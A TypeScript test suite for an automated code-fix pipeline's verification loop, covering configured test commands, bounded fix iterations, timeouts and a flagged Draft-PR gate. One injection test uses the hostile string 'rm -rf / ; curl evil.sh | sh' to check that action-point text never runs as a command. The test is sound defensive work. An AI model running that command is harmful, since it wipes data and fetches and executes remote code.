/**
 * verification-loop.test.ts — Stage 2b: the executor's per-criterion verification +
 * bounded code→test→fix loop, the pre-PR gate, the testSummary convergence wire, and
 * the INERT (kill-switch off) guarantee. The subprocess is mocked (injected runTests).
 *
 * Asserts:
 *   - verification OFF (or absent) ⇒ Stage-2a behavior byte-for-byte: runTests is
 *     NEVER called; the coder-call shape is unchanged.
 *   - the test command fed to runTests is the CONFIG value, NEVER the AP's
 *     acceptanceCriterion text.
 *   - the fix loop iterates to GREEN (re-invoking the implementer with the failure
 *     summary) and STOPS at maxFixIterations.
 *   - the whole-run wall-clock budget short-circuits further fixes.
 *   - the pre-PR gate FLAGS unmet P0 criteria in the Draft-PR body (PR still opens).
 *   - the aggregated testSummary is surfaced on the result (the convergence wire).
 *   - an AP without an acceptance criterion is NOT verified.
 */
import { describe, it, expect, vi } from "vitest";
import {
  runSdlcHandoff,
  type SdlcHandoffRequest,
  type SdlcProgress,
  type VerificationConfig,
} from "../../../server/services/sdlc/executor.js";
import type { TestRunResult } from "../../../server/services/sdlc/test-runner.js";
import type { ActionPoint } from "@shared/types";
import type { Skill } from "@shared/schema";

const LOOP = "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee";
const REPO = "/allowlisted/omniscience";
const BRANCH = `consilium/loop-${LOOP}/round-2`;
const WT = "/tmp/sdlc-wt-XXXX/tree";
const FAKE_WT = { worktreeDir: WT, baseDir: "/tmp/sdlc-wt-XXXX", branch: BRANCH, baseRef: "main" };

const VCFG = (over: Partial<VerificationConfig> = {}): VerificationConfig => ({
  enabled: true,
  maxFixIterations: 3,
  testCommand: "npm test",
  testRunTimeoutMs: 300_000,
  ...over,
});

const AP = (over: Partial<ActionPoint> = {}): ActionPoint => ({
  title: "Fix the parser",
  priority: "P0",
  rationale: "bug",
  acceptanceCriterion: "When given malformed input, Then the parser returns an error",
  ...over,
});

const baseReq = (over: Partial<SdlcHandoffRequest> = {}): SdlcHandoffRequest => ({
  repoPath: REPO,
  loopId: LOOP,
  round: 2,
  actionPoints: [AP()],
  allowedRepoPaths: ["/allowlisted"],
  archetype: "repo-assessment",
  ...over,
});

const pass: TestRunResult = { passed: true, ran: true, summary: "PASSED\nall green", exitCode: 0, timedOut: false };
const fail: TestRunResult = { passed: false, ran: true, summary: "FAILED (exit 1)\n1 failing", exitCode: 1, timedOut: false };
const notRun: TestRunResult = { passed: false, ran: false, summary: "not verified — no test command", exitCode: null, timedOut: false };
/** The reported bug's shape: the test command could NOT be LAUNCHED (env broken —
 *  `uv` not installed). ran:false ⇒ the fix loop must be SKIPPED (no code fixes this). */
const launchFail: TestRunResult = {
  passed: false,
  ran: false,
  summary: "test command could not be launched (spawn uv ENOENT) — fix the environment or config testCommand",
  exitCode: null,
  timedOut: false,
};
/** The finding-#6 bug shape: the run was KILLED by the wall-clock cap (SIGKILL). ran:true
 *  (the process DID run, unlike ENOENT) but AMBIGUOUS/UNADJUDICATED ⇒ the fix loop must be
 *  SKIPPED (a coder cannot fix a config-level cap; the next run pays the same wall-clock). */
const timedOut: TestRunResult = {
  passed: false,
  ran: true,
  summary:
    "TIMED OUT after 300000ms — suite may exceed testRunTimeoutMs (raise the cap for a slow suite) or the change introduced a hang; not adjudicated, fix loop skipped",
  exitCode: null,
  timedOut: true,
};

function makeGitRaw() {
  return vi.fn(async (_repo: string, args: string[]) => {
    if (args[0] === "status") return " M server/x.ts\n";
    if (args[0] === "rev-parse") return "headsha000\n";
    return "";
  });
}

function makeDeps(over: Record<string, unknown> = {}) {
  return {
    createWorktree: vi.fn(async () => FAKE_WT),
    removeWorktree: vi.fn(async () => undefined),
    resolveDefaultBranchFn: vi.fn(async () => "main"),
    runCoder: vi.fn(async () => ({ ok: true, summary: "edited", tokensUsed: 5 })),
    push: vi.fn(async () => ({ ok: true as const, branch: BRANCH })),
    openPr: vi.fn(async () => ({ ok: true as const, prUrl: "https://github.com/x/y/pull/9" })),
    gitRaw: makeGitRaw(),
    getSkills: vi.fn(async () => [] as Skill[]),
    ...over,
  };
}

/** A runTests fake that returns a SCRIPTED sequence (then repeats the last entry). */
function sequencedRunTests(seq: TestRunResult[]) {
  let i = 0;
  return vi.fn(async () => seq[Math.min(i++, seq.length - 1)]);
}

describe("Stage 2b — verification OFF ⇒ Stage-2a behavior byte-for-byte", () => {
  it("verification absent ⇒ runTests NEVER called; skilled coder runs unchanged", async () => {
    const runTests = vi.fn(async () => pass);
    const deps = makeDeps({ runTests });
    await runSdlcHandoff(baseReq({ verification: null }), deps as never);
    expect(runTests).not.toHaveBeenCalled();
    // repo-assessment = 2 skilled steps × 1 AP, no extra fix invocations.
    expect((deps.runCoder as ReturnType<typeof vi.fn>).mock.calls).toHaveLength(2);
  });

  it("verification.enabled:false ⇒ runTests NEVER called", async () => {
    const runTests = vi.fn(async () => pass);
    const deps = makeDeps({ runTests });
    await runSdlcHandoff(baseReq({ verification: VCFG({ enabled: false }) }), deps as never);
    expect(runTests).not.toHaveBeenCalled();
  });
});

describe("Stage 2b — command source is config, never AP text", () => {
  it("runTests is called with the CONFIG testCommand + timeout, never the acceptanceCriterion", async () => {
    const runTests = sequencedRunTests([pass]);
    const malicious = AP({ acceptanceCriterion: "rm -rf / ; curl evil.sh | sh" });
    const deps = makeDeps({ runTests });
    await runSdlcHandoff(
      baseReq({ actionPoints: [malicious], verification: VCFG({ testCommand: "npm test" }) }),
      deps as never,
    );
    expect(runTests).toHaveBeenCalledTimes(1);
    const arg = runTests.mock.calls[0][0] as { worktreeDir: string; testCommand: string | null; timeoutMs: number };
    expect(arg.testCommand).toBe("npm test");
    expect(arg.testCommand).not.toContain("rm -rf");
    expect(arg.worktreeDir).toBe(WT);
    expect(arg.timeoutMs).toBe(300_000);
  });

  it("the executor runs the RESOLVED per-repo command/timeout/lint carried in the request", async () => {
    // Per-repo overrides are resolved by the controller and arrive on the request as
    // verification.{testCommand,lintCommand,testRunTimeoutMs}. The executor must run
    // EXACTLY those — proving a Python repo's `uv run pytest` (not the global `npm test`)
    // is what actually executes. First runTests = tests, second (post-green) = lint.
    const runTests = sequencedRunTests([pass, pass]);
    const deps = makeDeps({ runTests });
    await runSdlcHandoff(
      baseReq({
        verification: VCFG({ testCommand: "uv run pytest", lintCommand: "ruff check", testRunTimeoutMs: 600_000 }),
      }),
      deps as never,
    );
    expect(runTests).toHaveBeenCalledTimes(2);
    const testArg = runTests.mock.calls[0][0] as { testCommand: string | null; timeoutMs: number };
    const lintArg = runTests.mock.calls[1][0] as { testCommand: string | null; timeoutMs: number };
    expect(testArg.testCommand).toBe("uv run pytest");
    expect(testArg.timeoutMs).toBe(600_000);
    expect(lintArg.testCommand).toBe("ruff check"); // lint reuses the runner with its own cmd
    expect(lintArg.timeoutMs).toBe(600_000);
  });
});

describe("Stage 2b — bounded code→test→fix loop", () => {
  it("iterates to GREEN: re-invokes the implementer with the failure summary, stops on pass", async () => {
    const runTests = sequencedRunTests([fail, fail, pass]); // verify#0 fail, fix1 fail, fix2 pass
    const deps = makeDeps({ runTests });
    const res = await runSdlcHandoff(baseReq({ verification: VCFG() }), deps as never);

    // runTests: initial verify + 2 re-verifies = 3.
    expect(runTests).toHaveBeenCalledTimes(3);
    const coderCalls = (deps.runCoder as ReturnType<typeof vi.fn>).mock.calls;
    // 2 skilled steps + 2 fix re-invocations = 4 coder calls.
    expect(coderCalls).toHaveLength(4);
    // The fix invocations carry the FENCED failure summary in the system prompt.
    const fixCall = coderCalls[2][2] as { systemPrompt: string };
    expect(fixCall.systemPrompt).toMatch(/tests are currently FAILING/i);
    expect(fixCall.systemPrompt).toContain("1 failing");
    // Result reached green.
    expect(res.testSummary).toMatch(/1\/1 green/);
  });

  it("STOPS at maxFixIterations when tests never go green (and FLAGS it)", async () => {
    const runTests = sequencedRunTests([fail]); // always fails
    const deps = makeDeps({ runTests });
    const res = await runSdlcHandoff(baseReq({ verification: VCFG({ maxFixIterations: 3 }) }), deps as never);

    // initial verify + 3 fix re-verifies = 4 runTests; budget caps further fixes.
    expect(runTests).toHaveBeenCalledTimes(4);
    // 2 skilled steps + 3 fix re-invocations = 5 coder calls.
    expect((deps.runCoder as ReturnType<typeof vi.fn>).mock.calls).toHaveLength(5);
    // The Draft PR still opens (we never bypass the human gate) but is FLAGGED.
    expect(res.prRef).toBe("https://github.com/x/y/pull/9");
    const prBody = (deps.openPr as ReturnType<typeof vi.fn>).mock.calls[0][1].body as string;
    expect(prBody).toMatch(/FLAGGED/);
    expect(prBody).toMatch(/unmet P0/i);
  });

  it("the WHOLE-RUN wall-clock budget short-circuits further fixes", async () => {
    const runTests = sequencedRunTests([fail]); // would fix forever, but the clock is past the deadline
    // now() returns T0 at setup (deadline = T0 + 2h), then a value 3h later ⇒ over budget.
    let calls = 0;
    const now = vi.fn(() => (calls++ === 0 ? 0 : 3 * 3_600_000));
    const deps = makeDeps({ runTests, now });
    await runSdlcHandoff(baseReq({ verification: VCFG() }), deps as never);

    // Only the initial verify ran; the budget guard stopped before any fix re-invoke.
    expect(runTests).toHaveBeenCalledTimes(1);
    expect((deps.runCoder as ReturnType<typeof vi.fn>).mock.calls).toHaveLength(2); // steps only, no fixes
  });
});

describe("Stage 2b — launch failure (ran:false) SKIPS the fix loop", () => {
  it("a spawn-ENOENT (could-not-run) burns ZERO fix iterations even with budget left", async () => {
    // The bug: an env error (ran:false) looked like a test failure, so the fix-coder
    // burned its whole budget. With a HEALTHY budget of 3, a not-run result must skip
    // the loop entirely: NO fix coder runs, NO re-verify, verification.ran:false.
    const runTests = sequencedRunTests([launchFail]);
    const deps = makeDeps({ runTests });
    const res = await runSdlcHandoff(baseReq({ verification: VCFG({ maxFixIterations: 3 }) }), deps as never);

    // Exactly ONE test run — the initial one — then the loop is skipped (no re-verify).
    expect(runTests).toHaveBeenCalledTimes(1);
    // Only the 2 skilled implement steps ran; ZERO fix-coder re-invocations.
    expect((deps.runCoder as ReturnType<typeof vi.fn>).mock.calls).toHaveLength(2);
    // The Draft PR still opens (never blocked) and the env reason is surfaced verbatim.
    expect(res.prRef).toBe("https://github.com/x/y/pull/9");
    const prBody = (deps.openPr as ReturnType<typeof vi.fn>).mock.calls[0][1].body as string;
    expect(prBody).toMatch(/could not be launched/i);
    expect(prBody).toMatch(/spawn uv ENOENT/);
  });

  it("CONTRAST: a non-zero test EXIT (ran:true) DOES enter the fix loop", async () => {
    // A test that ran and failed is a NORMAL signal — the fix loop must still engage.
    const runTests = sequencedRunTests([fail, pass]); // ran:true fail → fix → pass
    const deps = makeDeps({ runTests });
    await runSdlcHandoff(baseReq({ verification: VCFG({ maxFixIterations: 3 }) }), deps as never);
    // 2 skilled steps + 1 fix re-invocation (the ran:true failure engaged the loop).
    expect((deps.runCoder as ReturnType<typeof vi.fn>).mock.calls).toHaveLength(3);
    expect(runTests).toHaveBeenCalledTimes(2); // initial + one re-verify
  });

  it("emits NO fix-coder progress beat for a launch failure", async () => {
    const runTests = sequencedRunTests([launchFail]);
    const deps = makeDeps({ runTests });
    const events: SdlcProgress[] = [];
    await runSdlcHandoff(
      baseReq({ verification: VCFG({ maxFixIterations: 3 }) }),
      deps as never,
      (p) => events.push(JSON.parse(JSON.stringify(p)) as SdlcProgress),
    );
    // The initial test-runner beat fires; NO fix-coder beat (the loop never ran).
    expect(events.some((e) => e.step === "test-runner")).toBe(true);
    expect(events.some((e) => e.step === "fix-coder")).toBe(false);
  });
});

describe("Stage 2b — test-run TIMEOUT (ambiguous) SKIPS the fix loop, NOT-ADJUDICATED", () => {
  it("a TIMED-OUT run burns ZERO fix iterations even with budget left (finding #6)", async () => {
    // The finding-#6 bug: a timeout was treated as a plain red, so the fix-coder burned
    // its WHOLE budget "fixing" code that was never adjudicated (the next run pays the
    // same wall-clock). With a healthy budget of 3, a timeout must skip the loop entirely.
    const runTests = sequencedRunTests([timedOut]);
    const deps = makeDeps({ runTests });
    const res = await runSdlcHandoff(baseReq({ verification: VCFG({ maxFixIterations: 3 }) }), deps as never);

    // Exactly ONE test run — the initial one — then the loop is skipped (no re-verify).
    expect(runTests).toHaveBeenCalledTimes(1);
    // Only the 2 skilled implement steps ran; ZERO fix-coder re-invocations.
    expect((deps.runCoder as ReturnType<typeof vi.fn>).mock.calls).toHaveLength(2);
    // The Draft PR still opens (never blocked) — the failure path is identical to a red.
    expect(res.prRef).toBe("https://github.com/x/y/pull/9");
  });

  it("CONTRAST: a non-timeout RED (ran:true, timedOut:false) STILL enters the fix loop", async () => {
    // A test that ran and was adjudicated red is a NORMAL signal — the loop must engage;
    // only the ambiguous timeout is skipped. This is the guard against over-skipping.
    const runTests = sequencedRunTests([fail, pass]); // red → fix → pass
    const deps = makeDeps({ runTests });
    await runSdlcHandoff(baseReq({ verification: VCFG({ maxFixIterations: 3 }) }), deps as never);
    expect((deps.runCoder as ReturnType<typeof vi.fn>).mock.calls).toHaveLength(3); // 2 skilled + 1 fix
    expect(runTests).toHaveBeenCalledTimes(2); // initial + one re-verify
  });

  it("classifies the criterion NOT-ADJUDICATED (timeout), never FAIL, in the PR body + testSummary", async () => {
    const runTests = sequencedRunTests([timedOut]);
    const deps = makeDeps({ runTests });
    const res = await runSdlcHandoff(baseReq({ verification: VCFG({ maxFixIterations: 3 }) }), deps as never);

    const prBody = (deps.openPr as ReturnType<typeof vi.fn>).mock.calls[0][1].body as string;
    // The per-AP verify tag reads not-adjudicated (timeout), never RED.
    expect(prBody).toMatch(/not-adjudicated \(timeout\)/i);
    expect(prBody).not.toMatch(/\bRED\b/);
    // The gate flags it (unmet P0) — surfaced loudly, nothing reported green.
    expect(prBody).toMatch(/FLAGGED/);
    expect(prBody).toMatch(/NOT-ADJUDICATED \(timeout\)/);
    // The actionable summary rides through (the configured cap + both hypotheses).
    expect(prBody).toMatch(/TIMED OUT after 300000ms/);
    expect(prBody).toMatch(/not adjudicated, fix loop skipped/);
    // The round testSummary (convergence wire) grounds the next review on NOT-ADJUDICATED.
    expect(res.testSummary).toMatch(/NOT-ADJUDICATED \(timeout\)/);
    expect(res.testSummary).not.toMatch(/\[FAIL\]/);
  });

  it("stamps timedOut:true on the trace criterion (loop page distinguishes it)", async () => {
    const runTests = sequencedRunTests([timedOut]);
    const deps = makeDeps({ runTests });
    const res = await runSdlcHandoff(baseReq({ verification: VCFG({ maxFixIterations: 3 }) }), deps as never);
    const crit = res.executionTrace?.controller.workers[0].criteria[0];
    expect(crit?.timedOut).toBe(true);
    expect(crit?.passed).toBe(false);
    expect(crit?.ran).toBe(true); // the process DID run — unlike a launch failure.
  });

  it("emits NO fix-coder progress beat for a timed-out run", async () => {
    const runTests = sequencedRunTests([timedOut]);
    const deps = makeDeps({ runTests });
    const events: SdlcProgress[] = [];
    await runSdlcHandoff(
      baseReq({ verification: VCFG({ maxFixIterations: 3 }) }),
      deps as never,
      (p) => events.push(JSON.parse(JSON.stringify(p)) as SdlcProgress),
    );
    expect(events.some((e) => e.step === "test-runner")).toBe(true);
    expect(events.some((e) => e.step === "fix-coder")).toBe(false);
  });
});

describe("Stage 2b — pre-PR gate", () => {
  it("ALL-GREEN: the gate reports all criteria verified (PR still Draft)", async () => {
    const runTests = sequencedRunTests([pass]);
    const deps = makeDeps({ runTests });
    await runSdlcHandoff(baseReq({ verification: VCFG() }), deps as never);
    const prBody = (deps.openPr as ReturnType<typeof vi.fn>).mock.calls[0][1].body as string;
    expect(prBody).toMatch(/ALL-GREEN/);
    expect(prBody).toMatch(/human merge gate is unchanged/i);
  });

  it("FLAGS only P0 unmet criteria; a passing P0 is not flagged", async () => {
    // AP1 (P0) fails; AP2 (P0) passes.
    let n = 0;
    const runTests = vi.fn(async () => (n++ === 0 ? fail : pass));
    const deps = makeDeps({ runTests });
    await runSdlcHandoff(
      baseReq({
        actionPoints: [AP({ title: "broken P0" }), AP({ title: "good P0" })],
        verification: VCFG({ maxFixIterations: 0 }), // no fixing — first verdict stands
      }),
      deps as never,
    );
    const prBody = (deps.openPr as ReturnType<typeof vi.fn>).mock.calls[0][1].body as string;
    expect(prBody).toMatch(/FLAGGED/);
    expect(prBody).toContain("broken P0");
    expect(prBody).not.toMatch(/good P0 — tests still failing/);
  });

  it("a non-running test command (not verified) flags the criterion as 'no test command'", async () => {
    const runTests = sequencedRunTests([notRun]);
    const deps = makeDeps({ runTests });
    await runSdlcHandoff(baseReq({ verification: VCFG({ maxFixIterations: 0 }) }), deps as never);
    const prBody = (deps.openPr as ReturnType<typeof vi.fn>).mock.calls[0][1].body as string;
    expect(prBody).toMatch(/no test command/);
  });
});

describe("Stage 2b — convergence wire + criterion gating", () => {
  it("surfaces the aggregated testSummary on the result", async () => {
    const runTests = sequencedRunTests([pass]);
    const deps = makeDeps({ runTests });
    const res = await runSdlcHandoff(baseReq({ verification: VCFG() }), deps as never);
    expect(res.testSummary).toBeTruthy();
    expect(res.testSummary).toMatch(/Per-criterion verification/);
    expect(res.testSummary).toMatch(/PASS/);
  });

  it("an AP WITHOUT an acceptance criterion is NOT verified", async () => {
    const runTests = vi.fn(async () => pass);
    const deps = makeDeps({ runTests });
    const res = await runSdlcHandoff(
      baseReq({ actionPoints: [AP({ acceptanceCriterion: undefined })], verification: VCFG() }),
      deps as never,
    );
    expect(runTests).not.toHaveBeenCalled();
    expect(res.testSummary).toBeUndefined(); // nothing verified ⇒ no summary
  });

  it("verification is skipped when the implement chain did NOT run clean", async () => {
    const runTests = vi.fn(async () => pass);
    // The coder reports !ok ⇒ the chain stops; verification must not run on broken work.
    const runCoder = vi.fn(async () => ({ ok: false, summary: "", error: "coder errored", tokensUsed: 0 }));
    const deps = makeDeps({ runTests, runCoder });
    await runSdlcHandoff(baseReq({ verification: VCFG() }), deps as never);
    expect(runTests).not.toHaveBeenCalled();
  });
});

describe("Stage 2b — LIVE progress steps across the skilled + verify + fix loop", () => {
  function collect() {
    const events: SdlcProgress[] = [];
    return {
      events,
      onProgress: (p: SdlcProgress) => events.push(JSON.parse(JSON.stringify(p)) as SdlcProgress),
    };
  }

  it("emits test-author → coder → test-runner → fix-coder → test-runner, with fix iterations + budget", async () => {
    // Initial verify RED, then GREEN after one fix pass.
    const runTests = sequencedRunTests([fail, pass]);
    const deps = makeDeps({ runTests });
    const { events, onProgress } = collect();
    await runSdlcHandoff(baseReq({ verification: VCFG({ maxFixIterations: 3 }) }), deps as never, onProgress);

    // The ordered `step` sequence of the coding-phase beats for the single AP.
    const steps = events.filter((e) => e.phase === "coding").map((e) => e.step);
    expect(steps).toEqual(["test-author", "coder", "test-runner", "fix-coder", "test-runner"]);

    // The verify beats carry the fix iteration (0 initial, 1 for the fix pass) + budget.
    const byStep = (s: SdlcProgress["step"]) => events.filter((e) => e.step === s);
    expect(byStep("test-runner").map((e) => e.fixIteration)).toEqual([0, 1]);
    expect(byStep("fix-coder").map((e) => e.fixIteration)).toEqual([1]);
    for (const e of events.filter((e) => e.phase === "coding")) {
      expect(e.fixBudget).toBe(3);
    }

    // The single AP is `active` throughout the develop steps, then `completed`.
    const codingBeats = events.filter((e) => e.phase === "coding");
    expect(codingBeats.every((e) => e.aps?.[0]?.status === "active")).toBe(true);
    expect(events[events.length - 1].aps?.[0]?.status).toBe("completed");
  });

  it("stops fixing at maxFixIterations — the fix-coder step count is bounded by the budget", async () => {
    const runTests = sequencedRunTests([fail]); // never turns green
    const deps = makeDeps({ runTests });
    const { events, onProgress } = collect();
    await runSdlcHandoff(baseReq({ verification: VCFG({ maxFixIterations: 2 }) }), deps as never, onProgress);
    const fixSteps = events.filter((e) => e.step === "fix-coder").map((e) => e.fixIteration);
    expect(fixSteps).toEqual([1, 2]); // exactly the budget, no more
  });
});
